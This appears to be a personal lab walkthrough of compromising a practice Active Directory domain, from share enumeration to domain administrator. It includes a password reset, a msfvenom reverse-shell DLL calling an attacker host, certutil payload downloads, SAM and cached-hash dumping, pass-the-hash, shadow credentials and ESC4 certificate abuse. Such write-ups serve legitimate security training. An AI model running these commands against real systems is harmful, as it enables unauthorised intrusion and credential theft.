network and domain disvovery
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD9]
└─$ netexec smb 10.0.2.0/24
SMB         10.0.2.9        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hackerblueprint.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.10       445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hackerblueprint.local) (signing:False) (SMBv1:None)
SMB         10.0.2.11       445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hackerblueprint.local) (signing:False) (SMBv1:None)
SMB         10.0.2.1        445    DESKTOP-CIVQJ2K  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CIVQJ2K) (domain:DESKTOP-CIVQJ2K) (signing:True) (SMBv1:None)

```
![[Pasted image 20260818064709.png]]

spray the creds. We have read access on DC01 IT-FILES Share
``` sh
──(kali㉿kali)-[~/writeups/ad/AD9/loot]
└─$ nxc-sweep 10.0.2.9 -u bthompson -p 'Iceman#8777'
[*] Starting NXC sweep for 10.0.2.9 as bthompson ...
                                                                                                                                                                                                                   
[+] Port 445 open. Checking smb ...                                                                                                                                                                                
SMB         10.0.2.9        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hackerblueprint.local) (signing:True) (SMBv1:None) (Null Auth:True)                                
SMB         10.0.2.9        445    DC01             [+] hackerblueprint.local\bthompson:Iceman#8777 
SMB         10.0.2.9        445    DC01             [*] Enumerated shares
SMB         10.0.2.9        445    DC01             Share           Permissions     Remark
SMB         10.0.2.9        445    DC01             -----           -----------     ------
SMB         10.0.2.9        445    DC01             ADMIN$                          Remote Admin
SMB         10.0.2.9        445    DC01             C$                              Default share
SMB         10.0.2.9        445    DC01             IPC$            READ            Remote IPC
SMB         10.0.2.9        445    DC01             IT-Files        READ            IT Department Files
SMB         10.0.2.9        445    DC01             NETLOGON        READ            Logon server share 
SMB         10.0.2.9        445    DC01             SYSVOL          READ            Logon server share 


```
![[Pasted image 20260818065033.png]]

get the items from share. but nothing interesting
```sh
┌──(kali㉿kali)-[~/writeups/ad/AD9/loot]
└─$ impacket-smbclient hackerblueprint/bthompson:'Iceman#8777'@10.0.2.9
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
IPC$
IT-Files
NETLOGON
SYSVOL
# use IT-Files
# tree
/network-info.txt
/server-notes.txt
Finished - 0 files and folders
# get network-info.txt
# get server-notes.txt
# 
# exit
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/writeups/ad/AD9/loot]
└─$ ls
network-info.txt  pass  server-notes.txt  usernames
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/writeups/ad/AD9/loot]
└─$ cat network-info.txt 
Internal network: 10.0.2.0/24
DC01: 10.0.2.9
CLIENT-1: 10.0.2.11
CLIENT-2: 10.0.2.10
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/writeups/ad/AD9/loot]
└─$ cat server-notes.txt 
Server maintenance schedule
DC01 - patch window: Sunday 2AM
CLIENT-1 - IIS restart needed
CLIENT-2 - disk cleanup pending

```
![[Pasted image 20260818065228.png]]

start bloodhound and collect data
![[Pasted image 20260818065609.png]]

username enum
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD9/loot]
└─$ netexec ldap 10.0.2.9 -u bthompson -p 'Iceman#8777' --users
LDAP        10.0.2.9        389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hackerblueprint.local) (signing:None) (channel binding:Never) 
LDAP        10.0.2.9        389    DC01             [+] hackerblueprint.local\bthompson:Iceman#8777 
LDAP        10.0.2.9        389    DC01             [*] Enumerated 15 domain users: hackerblueprint.local
LDAP        10.0.2.9        389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.0.2.9        389    DC01             Administrator                 2026-04-27 09:12:44 0        Built-in account for administering the computer/domain      
LDAP        10.0.2.9        389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.0.2.9        389    DC01             krbtgt                        2026-05-28 06:34:17 0        Key Distribution Center Service Account                     
LDAP        10.0.2.9        389    DC01             jmiller                       2026-06-01 17:04:02 3        IT Support Technician                                       
LDAP        10.0.2.9        389    DC01             bthompson                     2026-06-01 17:04:02 0        Helpdesk Analyst                                            
LDAP        10.0.2.9        389    DC01             crodriguez                    2026-06-01 17:04:02 0        Finance Coordinator                                         
LDAP        10.0.2.9        389    DC01             awhite                        2026-06-01 17:04:02 0        HR Generalist                                               
LDAP        10.0.2.9        389    DC01             pnguyen                       2026-06-01 17:04:02 0        IT Systems Administrator                                    
LDAP        10.0.2.9        389    DC01             lscott                        2026-06-01 17:04:02 0        Operations Analyst                                          
LDAP        10.0.2.9        389    DC01             dpark                         2026-06-01 17:04:03 0        IT Desktop Support                                          
LDAP        10.0.2.9        389    DC01             nwilliams                     2026-06-01 17:04:03 0        HR Coordinator                                              
LDAP        10.0.2.9        389    DC01             svc_backup                    2026-06-01 17:04:03 0        Backup Service Account                                      
LDAP        10.0.2.9        389    DC01             svc_web                       2026-06-01 17:04:03 0        Web Application Service                                     
LDAP        10.0.2.9        389    DC01             svc_config                    2026-06-01 17:04:03 0        Configuration Service Account                               
LDAP        10.0.2.9        389    DC01             svc_monitor                   2026-06-01 17:04:03 0        Monitoring Service Account      
```
![[Pasted image 20260818065731.png]]

check bloodhound results. We have Outbound Object Control over JMILLER
![[Pasted image 20260818070438.png]]


We also have Kerberoastable user SVC_WEB
![[Pasted image 20260818070423.png]]

Started with jmiller. Changed his password. Test creds and we have Client1 RDP as PWNED
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD9/loot]
└─$ net rpc password "jmiller" "Iceman#8777" -U "hackerblueprint.local"/"bthompson"%"Iceman#8777" -S "10.0.2.9"        
                                                                                                                                                             ┌──(kali㉿kali)-[~/writeups/ad/AD9/loot]
└─$ nxc-sweep 10.0.2.10 -u jmiller -p 'Iceman#8777'
[*] Starting NXC sweep for 10.0.2.10 as jmiller ...

[+] Port 445 open. Checking smb ...
SMB         10.0.2.10       445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hackerblueprint.local) (signing:False) (SMBv1:None)
SMB         10.0.2.10       445    CLIENT-1         [+] hackerblueprint.local\jmiller:Iceman#8777 
SMB         10.0.2.10       445    CLIENT-1         [*] Enumerated shares
SMB         10.0.2.10       445    CLIENT-1         Share           Permissions     Remark
SMB         10.0.2.10       445    CLIENT-1         -----           -----------     ------
SMB         10.0.2.10       445    CLIENT-1         ADMIN$                          Remote Admin
SMB         10.0.2.10       445    CLIENT-1         C$                              Default share
SMB         10.0.2.10       445    CLIENT-1         IPC$            READ            Remote IPC

[+] Port 5985 open. Checking winrm ...
WINRM       10.0.2.10       5985   CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-1) (domain:hackerblueprint.local) 
WINRM       10.0.2.10       5985   CLIENT-1         [-] hackerblueprint.local\jmiller:Iceman#8777

[+] Port 3389 open. Checking rdp ...
RDP         10.0.2.10       3389   CLIENT-1         [*] Windows 10 or Windows Server 2016 Build 19041 (name:CLIENT-1) (domain:hackerblueprint.local) (nla:True)
RDP         10.0.2.10       3389   CLIENT-1         [+] hackerblueprint.local\jmiller:Iceman#8777 (Pwn3d!)
                                                     


```
![[Pasted image 20260818070743.png]]

RDP to Client1 as jmiller. Start privesc with whoami /all
```sh
C:\Users\jmiller>whoami
hackerblueprint\jmiller

C:\Users\jmiller>hostname
Client-1
```
![[Pasted image 20260818071211.png]]

privescCheck. Not sure how to exploit...
``` sh
SeShutdownPrivilege           Disabled Shut down the system                       False
SeChangeNotifyPrivilege       Enabled  Bypass traverse checking                   False
SeUndockPrivilege             Disabled Remove computer from docking station       False
SeManageVolumePrivilege       Disabled Manage the files on a volume                True
SeIncreaseWorkingSetPrivilege Disabled Increase a process working set             False
SeTimeZonePrivilege
```

Found exploit for SeManageVolumePrivilege https://medium.com/@mrlionofficial/privilege-escalation-via-semanagevolumeprivilege-2ebc0077b961

Download exploit and move to target
```sh
PS C:\Users\jmiller\Desktop> certutil -urlcache -split -f "http://10.0.2.4:80/exploit.exe" exploit.exe
****  Online  ****
  0000  ...
  3000
CertUtil: -URLCache command completed successfully.

PS C:\Users\jmiller\Desktop> certutil -urlcache -split -f "http://10.0.2.4:80/exploit.exe" exploit.exe
****  Online  ****
  0000  ...
  3000
CertUtil: -URLCache command completed successfully.

PS C:\Users\jmiller\Desktop> icacls C:/Windows
C:/Windows NT SERVICE\TrustedInstaller:(F)
           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
           NT AUTHORITY\SYSTEM:(M)
           NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
           BUILTIN\Users:(M)
           BUILTIN\Users:(OI)(CI)(IO)(F)
           BUILTIN\Users:(RX)
           BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
           CREATOR OWNER:(OI)(CI)(IO)(F)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
```

We make msfvenom exploit and move to target C:\Windows\System32\wbem\tzres.dll & call systeminfo to trigger it.
```sh
┌──(kali㉿kali)-[~/writeups/ad/AD9/exploit]
└─$ msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=10.0.2.4 LPORT=443 -f dll > tzres.dll

No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes

                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/writeups/ad/AD9/exploit]
└─$ ls
exploit.exe  tzres.dll
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/writeups/ad/AD9/exploit]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.0.2.10 - - [18/Aug/2026 00:47:11] "GET /tzres.dll HTTP/1.1" 200 -
10.0.2.10 - - [18/Aug/2026 00:47:11] "GET /tzres.dll HTTP/1.1" 200 -

```
![[Pasted image 20260818074947.png]]

on windows
``` sh

PS C:\Users\jmiller\desktop> certutil -urlcache -split -f "http://10.0.2.4:80/Printconfig.dll" Printconfig.dll
****  Online  ****
  0000  ...
  2400
CertUtil: -URLCache command completed successfully.
PS C:\Users\jmiller\desktop> dir


    Directory: C:\Users\jmiller\desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         8/17/2026   9:31 PM         154304 credshunter.ps1
-a----         8/17/2026   9:37 PM          12288 exploit.exe
-a----          6/4/2026   2:51 AM           2348 Microsoft Edge.lnk
-a----         8/17/2026   9:22 PM         600580 powerup.ps1
-a----         8/17/2026   9:58 PM           9216 Printconfig.dll
-a----         8/17/2026   9:24 PM         238055 PrivescCheck.ps1


PS C:\Users\jmiller\desktop> copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\
PS C:\Users\jmiller\desktop> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\jmiller\desktop> $type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
>> $object = [Activator]::CreateInstance($type)
```

catch shell as system
``` sh
[+] [New Reverse Shell] => hackerblueprint.local 10.0.2.10 WINDOWS 👤 nt authority\system 😍️ Session ID <1>
[+] Added readline support...
[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
[+] Session log: /home/kali/.penelope/sessions/hackerblueprint.local~10.0.2.10-WINDOWS/2026_08_18-01_00_00-455-nt authority\system.log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Windows\system32>whoami
whoami
nt authority\system

```
![[Pasted image 20260818080059.png]]

add jmiller to admin group
``` sh
C:\Windows\system32>net localgroup "Administrators" jmiller /add
net localgroup "Administrators" jmiller /add
The command completed successfully.

```
![[Pasted image 20260818080208.png]]

test the creds for jmiller. We might need to use mimikatz for secrets dump...
```sh
┌──(kali㉿kali)-[~/writeups/ad/AD9/exploit]
└─$ nxc-sweep 10.0.2.10 -u jmiller -p 'Iceman#8777'      
[*] Starting NXC sweep for 10.0.2.10 as jmiller ...

[+] Port 445 open. Checking smb ...
SMB         10.0.2.10       445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hackerblueprint.local) (signing:False) (SMBv1:None)
SMB         10.0.2.10       445    CLIENT-1         [-] Connection Error: The NETBIOS connection with the remote host timed out.

[+] Port 5985 open. Checking winrm ...
WINRM       10.0.2.10       5985   CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-1) (domain:hackerblueprint.local) 
WINRM       10.0.2.10       5985   CLIENT-1         [+] hackerblueprint.local\jmiller:Iceman#8777 (Pwn3d!)
WINRM       10.0.2.10       5985   CLIENT-1         [-] hackerblueprint.local\jmiller:Iceman#8777 zip() argument 2 is longer than argument 1

[+] Port 3389 open. Checking rdp ...
RDP         10.0.2.10       3389   CLIENT-1         [*] Windows 10 or Windows Server 2016 Build 19041 (name:CLIENT-1) (domain:hackerblueprint.local) (nla:True)
RDP         10.0.2.10       3389   CLIENT-1         [+] hackerblueprint.local\jmiller:Iceman#8777 (Pwn3d!)

```
![[Pasted image 20260818080539.png]]

Secrets dump on Client1 ja jmiller. Found dpark cached domain login
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD9/exploit]
└─$ impacket-secretsdump jmiller@10.0.2.10
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xb51dd8ab70243f356304485d0077ebf0
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:0a214f632021783961a536ce9290b4ad:::
Brian:1002:aad3b435b51404eeaad3b435b51404ee:e618ab47ea4179bb6199a16daff38b5b:::
[*] Dumping cached domain logon information (domain/username:hash)
HACKERBLUEPRINT.LOCAL/jmiller:$DCC2$10240#jmiller#6a5188e20c96900d37c75d238fec5adb: (2026-08-18 04:11:01+00:00)
HACKERBLUEPRINT.LOCAL/dpark:$DCC2$10240#dpark#7bb63ec5fcd691768d66c052998261be: (2026-06-04 10:00:21+00:00)

```
![[Pasted image 20260818081715.png]]

crack it with john. DPARK : Martell_10
![[Pasted image 20260818082303.png]]

from bloodhound we add DPARK as owned and see that he has GenericWrite on NWILLIAMS. We can to targetedKerberoast on her
![[Pasted image 20260818082025.png]]

exploit genericWrite
``` sh
┌──(kali㉿kali)-[~/…/ad/AD9/exploit/targetedKerberoast]
└─$ certipy-ad shadow auto -u dpark@hackerblueprint.local -p 'Martell_10'  -account nwilliams -target-ip 10.0.2.9   
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: HACKERBLUEPRINT.LOCAL.
[!] Use -debug to print a stacktrace
[*] Targeting user 'nwilliams'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'b5624cf55c2247048d47227494e6a7cb'
[*] Adding Key Credential with device ID 'b5624cf55c2247048d47227494e6a7cb' to the Key Credentials for 'nwilliams'
[*] Successfully added Key Credential with device ID 'b5624cf55c2247048d47227494e6a7cb' to the Key Credentials for 'nwilliams'
[*] Authenticating as 'nwilliams' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'nwilliams@hackerblueprint.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'nwilliams.ccache'
[*] Wrote credential cache to 'nwilliams.ccache'
[*] Trying to retrieve NT hash for 'nwilliams'
[*] Restoring the old Key Credentials for 'nwilliams'
[*] Successfully restored the old Key Credentials for 'nwilliams'
[*] NT hash for 'nwilliams': ef567f64448732a584f60d8e3e323b5b

```
![[Pasted image 20260818083837.png]]

test the creds with pass-the-hash. We have Client2 pwned
```sh
┌──(kali㉿kali)-[~/writeups/ad/AD9/loot]
└─$ netexec smb ips -u nwilliams -H 'ef567f64448732a584f60d8e3e323b5b' 
SMB         10.0.2.10       445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hackerblueprint.local) (signing:False) (SMBv1:None)
SMB         10.0.2.11       445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hackerblueprint.local) (signing:False) (SMBv1:None)
SMB         10.0.2.9        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hackerblueprint.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.10       445    CLIENT-1         [+] hackerblueprint.local\nwilliams:ef567f64448732a584f60d8e3e323b5b 
SMB         10.0.2.11       445    CLIENT-2         [+] hackerblueprint.local\nwilliams:ef567f64448732a584f60d8e3e323b5b (Pwn3d!)
SMB         10.0.2.9        445    DC01             [+] hackerblueprint.local\nwilliams:ef567f64448732a584f60d8e3e323b5b 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/writeups/ad/AD9/loot]
└─$ netexec winrm ips -u nwilliams -H 'ef567f64448732a584f60d8e3e323b5b' 
WINRM       10.0.2.9        5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hackerblueprint.local) 
WINRM       10.0.2.11       5985   CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-2) (domain:hackerblueprint.local) 
WINRM       10.0.2.10       5985   CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-1) (domain:hackerblueprint.local) 
WINRM       10.0.2.9        5985   DC01             [-] hackerblueprint.local\nwilliams:ef567f64448732a584f60d8e3e323b5b
WINRM       10.0.2.11       5985   CLIENT-2         [+] hackerblueprint.local\nwilliams:ef567f64448732a584f60d8e3e323b5b (Pwn3d!)
WINRM       10.0.2.11       5985   CLIENT-2         [-] hackerblueprint.local\nwilliams:ef567f64448732a584f60d8e3e323b5b zip() argument 2 is longer than argument 1
WINRM       10.0.2.10       5985   CLIENT-1         [-] hackerblueprint.local\nwilliams:ef567f64448732a584f60d8e3e323b5b

```
![[Pasted image 20260818084110.png]]

we are admin on Client2
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD9/loot]
└─$ evil-winrm -u nwilliams -H 'ef567f64448732a584f60d8e3e323b5b' -i 10.0.2.11 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nwilliams\Documents> whoami
hackerblueprint\nwilliams
*Evil-WinRM* PS C:\Users\nwilliams\Documents> hostname
Client-2
*Evil-WinRM* PS C:\Users\nwilliams\Documents> whoami /all

USER INFORMATION
----------------

User Name                 SID
========================= ============================================
hackerblueprint\nwilliams S-1-5-21-633962655-485248531-2707014454-1608


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ===============================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators               Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner

```
![[Pasted image 20260818084208.png]]

used credentialHarvest script to check for creds. Got Creds for SVC_CONFIG : Kaylee@16
``` sh
*Evil-WinRM* PS C:\Users\nwilliams\Desktop> .\credshunter.ps1 -Path C:\ -ExcludePath C:\ProgramData\Microsoft, C:\Users\nwilliams\AppData, "C:\Program Files\Oracle", C:\Users\Rachel\AppData, C:\Windows\Microsoft.NET

<REDACTED>

[*] Stage 1.4 - PowerShell history
   +- [HIGH] powershell_history/ps_secstring_plain -> C:\Users\nwilliams\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt:3
        $SecurePass = ConvertTo-SecureString "Kaylee@16" -AsPlainText -Force
   +- [HIGH] powershell_history/invoke_credential -> C:\Users\nwilliams\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt:4
        $Cred = New-Object System.Management.Automation.PSCredential("HACKERBLUEPRINT\svc_config", $SecurePass)
        
        
        
<REDACTED>

*Evil-WinRM* PS C:\Users\nwilliams\Desktop> type "C:\Users\nwilliams\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Get-ADUser -Filter * | Select SamAccountName, Department
Get-ADGroupMember -Identity 'ServiceAccounts' | Select Name
$SecurePass = ConvertTo-SecureString "Kaylee@16" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential("HACKERBLUEPRINT\svc_config", $SecurePass)
Invoke-Command -ComputerName DC01 -Credential $Cred -ScriptBlock { Get-Service CertSvc }
Get-ADUser svc_config -Properties Description


```

Spray the creds but nothing interesting. Bloodhound shows we are in LASP_READERS group
![[Pasted image 20260818085431.png]]

Check certipy. Vulnerable to ESC4
``` sh
┌──(kali㉿kali)-[~/privesc/Credential-Hunting]
└─$ certipy-ad find -u svc_config@hackerblueprint.local -p 'Kaylee@16' -dc-ip 10.0.2.9  -vulnerable -stdout

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates

<REDACTED>

    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.

```


exploit
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD9/loot]
└─$ certipy-ad template \
    -u 'svc_config@hackerblueprint.local' -p 'Kaylee@16' \
    -dc-ip '10.0.2.9' -template 'RemoteAccess' \
    -write-default-configuration
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'RemoteAccess.json'
[*] Wrote current configuration for 'RemoteAccess' to 'RemoteAccess.json'
[*] Updating certificate template 'RemoteAccess'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'RemoteAccess'? (y/N): y
[*] Successfully updated 'RemoteAccess'
```
![[Pasted image 20260818090909.png]]


```sh
┌──(kali㉿kali)-[~/writeups/ad/AD9/loot]
└─$ certipy-ad req -u 'svc_config@hackerblueprint.local' -p 'Kaylee@16' -dc-ip '10.0.2.9' -target 'DC01.hackerblueprint.local' -template 'RemoteAccess' -upn 'administrator@hackerblueprint.local' -ca 'HACKERBLUEPRINT-CA'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@hackerblueprint.local'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

┌──(kali㉿kali)-[~/writeups/ad/AD9/loot]
└─$ certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.0.2.9'  

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@hackerblueprint.local'
[*] Using principal: 'administrator@hackerblueprint.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@hackerblueprint.local': aad3b435b51404eeaad3b435b51404ee:c0ced2de918b4a7c1b9f4efd225dd503


```
![[Pasted image 20260818091612.png]]

evil-winrm on DC01
```sh
┌──(kali㉿kali)-[~/writeups/ad/AD9/loot]
└─$ evil-winrm -u administrator -H 'c0ced2de918b4a7c1b9f4efd225dd503' -i 10.0.2.9 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
hackerblueprint\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
DC01
*Evil-WinRM* PS C:\Users\Administrator\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::50c8:8900:37fe:133d%14
   IPv4 Address. . . . . . . . . . . : 10.0.2.9
   Subnet Mask . . . . . . . . . . . : 255.255.255.0

```
![[Pasted image 20260818091700.png]]